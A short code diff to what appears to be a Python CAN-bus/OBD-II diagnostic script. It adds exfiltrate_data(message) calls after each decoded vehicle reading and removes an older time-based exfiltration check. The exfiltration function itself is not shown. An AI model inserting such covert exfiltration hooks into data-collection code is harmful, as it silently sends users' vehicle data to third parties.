@@ -416,6 +416,7 @@ if(REPORT):
                                                     result = eval(formula)
                                                     message = "{description}: {result}".format(description=description, result=result)
                                                     _output_message(message)
+                                                    exfiltrate_data(message)
                                                     if pid_int == int(received_pid):
                                                         if pid_int == int("0C", 16):
                                                             rpm = result
@@ -432,6 +433,7 @@ if(REPORT):
                                                     result += chr(c)
                                                 message = "{description}: {result}".format(description=description, result=result)
                                                 _output_message(message)
+                                                exfiltrate_data(message)
                                             except:
                                                 _output_message("Unable to parse response: {}.".format(response.data))
                             except can.CanError:
@@ -440,5 +442,3 @@ if(REPORT):
                 end = time.time()
                 hours, rem = divmod(end - start, 3600)
                 minutes, seconds = divmod(rem, 60)
-                if minutes >= exfiltrate_data_time:
-                    timestamp = str(datetime.datetime.now())
